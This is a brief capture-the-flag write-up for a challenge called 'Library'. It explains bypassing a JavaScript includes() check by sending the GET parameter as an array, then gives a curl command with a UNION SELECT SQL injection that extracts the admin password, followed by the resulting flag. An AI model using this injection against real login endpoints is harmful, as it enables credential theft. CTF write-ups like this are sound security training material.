# Library
* There are 2 things
  - js includes bypass via introducing array type get params
  - sql injection with query row and comment remaining

## Solves
* blind sqli with no single quote 
* quote confusion with unicode, encoding etc
* array type get params

## Answer

```
curl http://35.221.67.248:10501/actions/login?password=aaa&name=a&name=b%27%20UNION%20SELECT%20password%20from%20users%20where%20name=%27admin%27;%20-- 

Welcome, TSGCTF{s4m3_m3th0d_n4m3_d1ff3r3nt_cl4ss_b3h4v10r}. You now have access to the restricted archives.
```

